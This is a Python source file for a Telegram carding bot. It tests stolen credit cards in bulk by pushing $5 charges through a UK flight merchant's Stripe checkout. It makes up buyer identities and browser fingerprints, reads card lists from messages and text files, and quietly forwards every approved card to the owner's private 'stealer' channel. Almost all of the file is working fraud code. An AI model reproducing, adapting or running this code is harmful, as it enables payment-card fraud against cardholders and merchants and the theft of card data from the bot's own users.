import time
import asyncio
import re
import os
import random
import hashlib
import uuid
import requests
from faker import Faker
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# -------------------------------------------------------------
# Configuration
# -------------------------------------------------------------
GATE_NAME = "Stripe 5$"
AMOUNT = "5"  # Charge amount in USD
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
STEALER_CHANNEL_ID = -1003627495953

fake = Faker('en_GB')

# -------------------------------------------------------------
# Helper functions (synchronous, from original script)
# -------------------------------------------------------------
def generate_muid():
    return hashlib.md5(f"{time.time()}{random.random()}{os.urandom(8)}".encode()).hexdigest()[:16]

def generate_sid():
    return hashlib.md5(f"{random.randint(100000, 999999)}{time.time()}".encode()).hexdigest()[:16]

def generate_guid():
    return str(uuid.uuid4())

def get_user_agent():
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]
    return random.choice(agents)

# -------------------------------------------------------------
# Core synchronous charge function
# -------------------------------------------------------------
def charge_card_sync(card_string, amount):
    """Charge a single card - returns (status, message, last4)"""
    try:
        parts = card_string.split('|')
        if len(parts) != 4:
            return "Error", "Invalid format (use cc|mm|yyyy|cvv)", None

        card_number = parts[0].strip().replace(" ", "")
        exp_month = parts[1].strip().zfill(2)
        exp_year = parts[2].strip()
        cvc = parts[3].strip()
        exp_year_full = f"20{exp_year}" if len(exp_year) == 2 else exp_year
        last4 = card_number[-4:]

        # Fake data
        email = fake.email()
        firstname = fake.first_name()
        lastname = fake.last_name()
        phone = f"+1{random.randint(1000000000, 9999999999)}"

        session = requests.Session()
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "upgrade-insecure-requests": "1",
            "user-agent": get_user_agent()
        }

        # Step 1: Visit site
        session.get("https://www.swiftflights.co.uk", headers=headers, timeout=30)
        session.get("https://www.swiftflights.co.uk/pay", headers=headers, timeout=30)

        # Step 2: Get Stripe cookies
        stripe_mid = ""
        stripe_sid = ""
        for cookie in session.cookies:
            if cookie.name == "__stripe_mid":
                stripe_mid = cookie.value
            if cookie.name == "__stripe_sid":
                stripe_sid = cookie.value

        # Step 3: Create payment intent
        boundary1 = f"----WebKitFormBoundary{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=16))}"
        data1 = f"--{boundary1}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\ncreate-payment\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"api_key\"\r\n\r\napi_key_001\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"amount\"\r\n\r\n{amount}\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\n{random.randint(100,999)}\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"first_name\"\r\n\r\n{firstname}\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"last_name\"\r\n\r\n{lastname}\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{email}\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"country_id\"\r\n\r\n38\r\n--{boundary1}\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n{phone}\r\n--{boundary1}--\r\n"

        r1 = session.post("https://www.swiftflights.co.uk/api/payments",
                          headers={
                              "accept": "*/*",
                              "content-type": f"multipart/form-data; boundary={boundary1}",
                              "origin": "https://www.swiftflights.co.uk",
                              "referer": "https://www.swiftflights.co.uk/pay",
                              "user-agent": headers["user-agent"]
                          },
                          data=data1,
                          allow_redirects=False,
                          timeout=30)

        transaction_ref = None
        if r1.status_code == 302 and "Location" in r1.headers:
            location = r1.headers["Location"]
            match = re.search(r'transaction_ref=([A-Z0-9]+)', location)
            if match:
                transaction_ref = match.group(1)

        if not transaction_ref:
            try:
                result = r1.json()
                if result.get("data", {}).get("transaction_ref"):
                    transaction_ref = result["data"]["transaction_ref"]
            except:
                pass

        if not transaction_ref:
            return "Error", "Transaction ref not found", last4

        # Step 4: Get payment page
        session.get(f"https://www.swiftflights.co.uk/payment?transaction_ref={transaction_ref}&module=payments", headers=headers, timeout=30)

        # Step 5: Create intent
        boundary2 = f"----WebKitFormBoundary{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=16))}"
        data2 = f"--{boundary2}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\ncreate-intent\r\n--{boundary2}\r\nContent-Disposition: form-data; name=\"transaction_ref\"\r\n\r\n{transaction_ref}\r\n--{boundary2}\r\nContent-Disposition: form-data; name=\"module\"\r\n\r\npayments\r\n--{boundary2}\r\nContent-Disposition: form-data; name=\"api_key\"\r\n\r\napi_key_001\r\n--{boundary2}--\r\n"

        r2 = session.post("https://www.swiftflights.co.uk/api/payment",
                          headers={
                              "accept": "*/*",
                              "content-type": f"multipart/form-data; boundary={boundary2}",
                              "origin": "https://www.swiftflights.co.uk",
                              "referer": f"https://www.swiftflights.co.uk/payment?transaction_ref={transaction_ref}&module=payments",
                              "user-agent": headers["user-agent"]
                          },
                          data=data2,
                          timeout=30)

        client_secret = None
        payment_intent_id = None
        try:
            data = r2.json()
            if data.get("status") and data.get("data"):
                client_secret = data["data"].get("client_secret")
                payment_intent_id = data["data"].get("payment_intent_id")
        except:
            pass

        if not client_secret or not payment_intent_id:
            return "Error", "Client secret not found", last4

        # Step 6: Generate fingerprint
        muid = stripe_mid if stripe_mid else generate_muid()
        sid = stripe_sid if stripe_sid else generate_sid()
        guid = generate_guid()
        session_id = f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}"

        stripe_data = {
            "return_url": f"https://www.swiftflights.co.uk/payment/success?payment_intent={payment_intent_id}&transaction_ref={transaction_ref}&module=payments",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_number,
            "payment_method_data[card][cvc]": cvc,
            "payment_method_data[card][exp_year]": exp_year_full,
            "payment_method_data[card][exp_month]": exp_month,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][country]": random.choice(['US', 'GB', 'CA']),
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": "stripe.js/c30beb05a2; stripe-js-v3/c30beb05a2; payment-element",
            "payment_method_data[referrer]": "https://www.swiftflights.co.uk",
            "payment_method_data[time_on_page]": str(random.randint(100000, 500000)),
            "payment_method_data[client_attribution_metadata][client_session_id]": session_id,
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "standard",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
            "payment_method_data[client_attribution_metadata][elements_session_id]": f"elements_session_{random.randint(1,999)}",
            "payment_method_data[client_attribution_metadata][elements_session_config_id]": f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}",
            "payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]": "payment",
            "payment_method_data[guid]": guid,
            "payment_method_data[muid]": muid,
            "payment_method_data[sid]": sid,
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_51SOyrXCnzY6pmE6aSw8ZFtYrTl7Fi3eTK1GoBCW7Kw0rYcUJZBsiaFSu7JZgFbtPVQpXDKu2o92X2gztbPwdNdGr00qQ1e3114",
            "client_attribution_metadata[client_session_id]": session_id,
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "standard",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[elements_session_id]": f"elements_session_{random.randint(1,999)}",
            "client_attribution_metadata[elements_session_config_id]": f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}",
            "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
            "client_secret": client_secret
        }

        stripe_headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": get_user_agent()
        }

        r3 = requests.post(f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm",
                           headers=stripe_headers,
                           data=stripe_data,
                           timeout=30)

        try:
            result = r3.json()
            if result.get("status") == "succeeded":
                return "Approved ✅", f"Charged ${amount} - {result.get('id', 'N/A')}", last4
            elif result.get("status") == "requires_action":
                return "3d/live card ♦️", "3D Secure Required", last4
            else:
                error_msg = result.get("error", {}).get("message", "Unknown error")
                decline_code = result.get("error", {}).get("decline_code", "")
                msg = f"{error_msg} ({decline_code})" if decline_code else error_msg
                return "Declined ❌", msg[:50], last4
        except:
            return "Error", "Stripe response error", last4

    except Exception as e:
        return "Error", str(e)[:50], None

# -------------------------------------------------------------
# Stealer function (keeps owner line – change if needed)
# -------------------------------------------------------------
async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML", reply_markup=None)
    except Exception as e:
        print(f"[Stealer Error] {e}")

# -------------------------------------------------------------
# Async wrapper
# -------------------------------------------------------------
async def call_swiftflights_api(fullcc):
    loop = asyncio.get_running_loop()
    status, msg, last4 = await loop.run_in_executor(None, charge_card_sync, fullcc, AMOUNT)
    return status, msg

def extract_cards(text):
    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

# -------------------------------------------------------------
# SINGLE CHECK COMMAND (/sf)
# -------------------------------------------------------------
@Client.on_message(filters.command("sf", [".", "/"]))
async def swiftflights_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /sf

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /sf cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = GATE_NAME

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        status, response = await call_swiftflights_api(fullcc)

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        if "Approved" in status:
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)

        display_status = f"<b>{status}</b>"

        finalresp = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""

        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# MASS CHECK (text/reply) (/msf)
# -------------------------------------------------------------
@Client.on_message(filters.command("msf", [".", "/"]))
async def swiftflights_mass_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        ccs = []
        if message.reply_to_message:
            reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        else:
            text_parts = message.text.split(maxsplit=1)
            if len(text_parts) > 1:
                ccs = extract_cards(text_parts[1])

        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /msf

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /msf cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# TXT FILE COMMAND (/tsf)
# -------------------------------------------------------------
@Client.on_message(filters.command("tsf", [".", "/"]))
async def swiftflights_txt_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        target_message = None
        if message.reply_to_message and message.reply_to_message.document:
            target_message = message.reply_to_message
        elif message.document:
            target_message = message

        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /tsf

⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
            return

        file_path = await Client.download_media(target_message)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return

        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# -------------------------------------------------------------
# SEQUENTIAL PROCESSING (with progress, separate approved, declined summary)
# -------------------------------------------------------------
async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
    total_cards = len(ccs)
    processed = 0
    approved_count = 0
    declined_count = 0
    gateway = GATE_NAME
    start_time = time.perf_counter()
    approved_cards = []

    progress_text = f"""SwiftFlights Stripe
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total_cards}
Approved ✅: 0
Declined ❌: 0
Remaining: {total_cards}

Checked by: {first_name} ({role})"""
    progress_msg = await message.reply(progress_text, quote=True, parse_mode=enums.ParseMode.HTML)

    for idx, fullcc in enumerate(ccs, 1):
        processed = idx
        remaining = total_cards - processed
        status, response = await call_swiftflights_api(fullcc)

        cc_num = fullcc.split('|')[0]
        getbin = await get_bin_details(cc_num)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""

        if "Approved" in status or "✅" in status:
            approved_count += 1
            response_status = "APPROVED ✅"
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc, "status": status, "response": response, "gateway": gateway,
                "brand": f"{brand}_{type_}-{level}", "bank": bank, "country": country, "flag": flag, "time": card_time
            })
            await send_hit_to_stealer(Client, fullcc, status, response, gateway, card_time, first_name, role)
        else:
            declined_count += 1
            response_status = "DECLINED ❌"

        try:
            await Client.edit_message_text(message.chat.id, progress_msg.id,
                f"""SwiftFlights Stripe
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total_cards}
Approved ✅: {approved_count}
Declined ❌: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})""", parse_mode=enums.ParseMode.HTML)
        except:
            pass
        await asyncio.sleep(0.5)

    await progress_msg.delete()

    for card in approved_cards:
        display_status = f"<b>{card['status']}</b>"
        approved_msg = f"""{display_status}

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)

    if approved_count > 0:
        declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        for card in declined_list[:15]:
            declined_summary += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            declined_summary += f"\n... and {declined_count - 15} more declined cards"
        declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total_cards}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})"""
        await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total_cards}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})""",
            quote=True, parse_mode=enums.ParseMode.HTML
        )

    await setantispamtime(user_id)
